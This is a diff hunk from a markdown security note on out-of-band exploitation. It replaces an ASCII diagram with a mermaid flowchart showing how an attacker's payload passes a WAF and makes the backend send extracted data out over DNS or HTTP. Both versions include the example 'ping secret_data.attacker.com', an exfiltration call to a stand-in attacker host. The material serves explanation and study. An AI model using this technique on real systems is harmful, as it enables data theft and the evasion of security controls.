@@ -24,19 +24,18 @@ This note covers the mechanisms of OOB exploitation, various protocol channels u
 
 ## ASCII Diagram: Out-of-Band Bypass Flow
 
-```text
-+-------------+                                   +-------------+                                    +-----------------+
-|             |  1. HTTP Request with OOB Payload |             |  2. Forwards Request               |                 |
-|   Attacker  | --------------------------------> |     WAF     | ---------------------------------> | Backend Server  |
-|             |                                   |             |                                    | (Vulnerable)    |
-+-------------+                                   +-------------+                                    +-----------------+
-       ^                                                 |                                                    |
-       |                                                 |  3. WAF Inspects Request (Pass)                    | 4. Executes Payload
-       |                                                 |  6. WAF Inspects Benign Response (Pass)            |    Extracts Data
-       |                                                 |                                                    |
-       |  5. Out-of-Band DNS/HTTP Request                |                                                    |
-       |  (e.g., ping secret_data.attacker.com)          |                                                    |
-       +------------------------------------------------------------------------------------------------------+
+```mermaid
+flowchart TD
+    Attacker[Attacker]
+    WAF[WAF]
+    Backend["Backend Server <br/> (Vulnerable)"]
+
+    Attacker -- "1. HTTP Request with OOB Payload" --> WAF
+    WAF -- "2. Forwards Request" --> Backend
+    WAF -. "3. WAF Inspects Request (Pass)" .-> Attacker
+    Backend -. "4. Executes Payload <br/> Extracts Data" .-> Backend
+    Backend -- "5. Out-of-Band DNS/HTTP Request <br/> (e.g., ping secret_data.attacker.com)" --> Attacker
+    Backend -- "6. WAF Inspects Benign Response (Pass)" --> WAF
 ```
 
 ## Exploitation Mechanics
